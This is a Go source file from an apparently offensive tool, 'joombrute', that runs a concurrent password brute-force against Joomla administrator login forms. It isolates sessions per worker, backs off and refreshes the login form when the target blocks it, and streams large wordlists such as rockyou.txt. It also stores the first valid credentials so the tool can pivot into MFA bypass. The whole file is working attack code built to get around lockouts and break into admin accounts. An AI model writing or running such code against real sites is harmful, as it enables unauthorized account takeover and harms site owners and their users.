// Package brute drives the admin-form credential bruteforce against a Joomla
// target. It owns the worker pool, per-worker session isolation, and the
// back-pressure logic when the target starts blocking us.
package brute

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/rvzsec/joombrute/internal/httpx"
	"github.com/rvzsec/joombrute/internal/joomla"
	"github.com/rvzsec/joombrute/internal/output"
)

// Config controls a Run() invocation.
type Config struct {
	Target          *joomla.Target
	Usernames       []string
	PasswordFile    string
	Concurrency     int
	Proxy           string
	UserAgent       string
	InsecureTLS     bool
	RequestTimeout  time.Duration
	// RefreshEvery N attempts forces a worker to re-fetch the login form.
	// Useful against targets that rotate session tokens aggressively.
	// 0 disables (one form per worker for the whole run).
	RefreshEvery    int
	// StopOnSuccess: kill all workers as soon as one valid pair lands.
	StopOnSuccess   bool
	// StopOnMFA: treat MFA-required (= valid creds, guarded) as a stop.
	StopOnMFA       bool
	// BackoffBlocked: when a worker sees OutcomeBlocked, sleep this long.
	BackoffBlocked time.Duration
	// FormFetchAttempts: how many times to retry GET /administrator/ on a
	// 500 / transport error before giving up on the worker. Default 3.
	// Joomla's session-init can race-fail under concurrent first-hit
	// load (especially on cold MySQL backends or shared hosts behind a
	// CDN), so a single 500 should not kill a whole worker slot.
	FormFetchAttempts int
	Sink              output.Sink
}

// Stats is reported when the run finishes.
type Stats struct {
	Attempted  int64
	Valid      int64
	MFAGuarded int64
	Blocked    int64
	Errors     int64
	Elapsed    time.Duration
	// FirstHit records the credential pair (and captive URL when MFA-
	// gated) of the first non-invalid outcome. Populated under hitMu.
	// Callers like `chain` use this to pivot into mfa-bypass / mfa-brute
	// without forcing the operator to re-discover the pair manually.
	FirstHit *FirstHit
}

// FirstHit is the captured credential pair from the first non-invalid
// outcome of a Run. Outcome is "success" or "mfa-required".
type FirstHit struct {
	Username   string
	Password   string
	Outcome    string
	CaptiveURL string
}

// credPair is a single username/password combo flowing through the channel.
type credPair struct {
	username string
	password string
}

// Run executes the bruteforce campaign described by cfg. It blocks until
// completion. The caller's ctx controls cancellation.
func Run(ctx context.Context, cfg Config) (Stats, error) {
	if cfg.Target == nil {
		return Stats{}, errors.New("brute: nil target")
	}
	if len(cfg.Usernames) == 0 {
		return Stats{}, errors.New("brute: no usernames")
	}
	if cfg.PasswordFile == "" {
		return Stats{}, errors.New("brute: no password wordlist")
	}
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 10
	}
	if cfg.FormFetchAttempts <= 0 {
		cfg.FormFetchAttempts = 3
	}
	if cfg.RequestTimeout == 0 {
		cfg.RequestTimeout = 15 * time.Second
	}
	if cfg.BackoffBlocked == 0 {
		cfg.BackoffBlocked = 5 * time.Second
	}
	if cfg.Sink == nil {
		cfg.Sink = output.NewConsoleSink(os.Stdout, false)
	}

	// Cancellable context derived from caller's so we can short-circuit.
	runCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobs := make(chan credPair, cfg.Concurrency*4)
	stats := &Stats{}
	var hitMu sync.Mutex
	start := time.Now()

	var wg sync.WaitGroup
	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			runWorker(runCtx, id, cfg, jobs, stats, &hitMu, cancel)
		}(i)
	}

	// Producer: stream passwords, cross-product with usernames. We pin
	// password as the outer loop (file -> stream) because the file is the
	// biggest dimension and we only want to scan it once.
	prodErr := streamCreds(runCtx, cfg.Usernames, cfg.PasswordFile, jobs)
	close(jobs)
	wg.Wait()

	stats.Elapsed = time.Since(start)
	return *stats, prodErr
}

// runWorker is one goroutine processing jobs from the channel. Each worker
// owns its own http.Client (= its own cookie jar = its own Joomla session).
func runWorker(ctx context.Context, id int, cfg Config, jobs <-chan credPair, stats *Stats, hitMu *sync.Mutex, cancel context.CancelFunc) {
	client, err := httpx.New(httpx.Config{
		Timeout:         cfg.RequestTimeout,
		Proxy:           cfg.Proxy,
		UserAgent:       cfg.UserAgent,
		InsecureTLS:     cfg.InsecureTLS,
		FollowRedirects: false,
	})
	if err != nil {
		cfg.Sink.Errorf("worker %d: client init: %v", id, err)
		atomic.AddInt64(&stats.Errors, 1)
		return
	}

	form, err := joomla.FetchLoginFormWithRetry(ctx, client, cfg.Target, cfg.FormFetchAttempts)
	if err != nil {
		// Cancelled context = graceful shutdown, not a real error.
		if ctx.Err() == nil {
			cfg.Sink.Errorf("worker %d: fetch form: %v", id, err)
			atomic.AddInt64(&stats.Errors, 1)
		}
		return
	}

	var sinceRefresh int

	for {
		select {
		case <-ctx.Done():
			return
		case pair, ok := <-jobs:
			if !ok {
				return
			}

			res, err := joomla.Attempt(ctx, client, form, pair.username, pair.password)
			if err != nil {
				// Cancelled context = graceful shutdown after a peer hit.
				// Not a real error worth surfacing to the operator.
				if ctx.Err() != nil {
					return
				}
				atomic.AddInt64(&stats.Errors, 1)
				cfg.Sink.Errorf("worker %d: attempt %s:%s: %v", id, pair.username, pair.password, err)
				continue
			}
			atomic.AddInt64(&stats.Attempted, 1)

			switch res.Outcome {
			case joomla.OutcomeSuccess:
				atomic.AddInt64(&stats.Valid, 1)
				cfg.Sink.Hit(output.Hit{
					Target:   cfg.Target.String(),
					Username: pair.username,
					Password: pair.password,
					Outcome:  "success",
				})
				// Record the first hit so callers (chain) can pivot
				// into mfa-bypass without rediscovering creds.
				hitMu.Lock()
				if stats.FirstHit == nil {
					stats.FirstHit = &FirstHit{
						Username: pair.username,
						Password: pair.password,
						Outcome:  "success",
					}
				}
				hitMu.Unlock()
				if cfg.StopOnSuccess {
					cancel()
					return
				}
			case joomla.OutcomeMFARequired:
				atomic.AddInt64(&stats.MFAGuarded, 1)
				cfg.Sink.Hit(output.Hit{
					Target:     cfg.Target.String(),
					Username:   pair.username,
					Password:   pair.password,
					Outcome:    "mfa-required",
					CaptiveURL: res.CaptiveURL,
				})
				hitMu.Lock()
				if stats.FirstHit == nil {
					stats.FirstHit = &FirstHit{
						Username:   pair.username,
						Password:   pair.password,
						Outcome:    "mfa-required",
						CaptiveURL: res.CaptiveURL,
					}
				}
				hitMu.Unlock()
				if cfg.StopOnMFA || cfg.StopOnSuccess {
					cancel()
					return
				}
			case joomla.OutcomeBlocked:
				atomic.AddInt64(&stats.Blocked, 1)
				cfg.Sink.Warnf("worker %d: blocked by target (HTTP %d) - backing off %s",
					id, res.Status, cfg.BackoffBlocked)
				select {
				case <-ctx.Done():
					return
				case <-time.After(cfg.BackoffBlocked):
				}
				// Force form refresh after a block - session may be killed.
				sinceRefresh = cfg.RefreshEvery
			case joomla.OutcomeInvalid:
				// Most common path, no log spam.
			case joomla.OutcomeUnknown:
				cfg.Sink.Debugf("worker %d: unknown outcome for %s (status %d, loc %q, snip %q)",
					id, pair.username, res.Status, res.Location, res.Snippet)
			}

			sinceRefresh++
			if cfg.RefreshEvery > 0 && sinceRefresh >= cfg.RefreshEvery {
				sinceRefresh = 0
				newForm, ferr := joomla.FetchLoginFormWithRetry(ctx, client, cfg.Target, cfg.FormFetchAttempts)
				if ferr != nil {
					if ctx.Err() == nil {
						cfg.Sink.Warnf("worker %d: refresh form: %v", id, ferr)
					}
					continue
				}
				form = newForm
			}
		}
	}
}

// streamCreds reads the password file line-by-line and emits one credPair per
// (username, password) onto jobs. Streaming avoids loading rockyou.txt
// (~14M lines, ~135MB) into memory.
func streamCreds(ctx context.Context, usernames []string, pwFile string, out chan<- credPair) error {
	f, err := os.Open(pwFile)
	if err != nil {
		return fmt.Errorf("open wordlist: %w", err)
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	// Big buffer - some wordlists contain absurdly long lines.
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)

	for sc.Scan() {
		pw := sc.Text()
		if pw == "" {
			continue
		}
		for _, u := range usernames {
			select {
			case <-ctx.Done():
				return nil
			case out <- credPair{username: u, password: pw}:
			}
		}
	}
	if err := sc.Err(); err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read wordlist: %w", err)
	}
	return nil
}
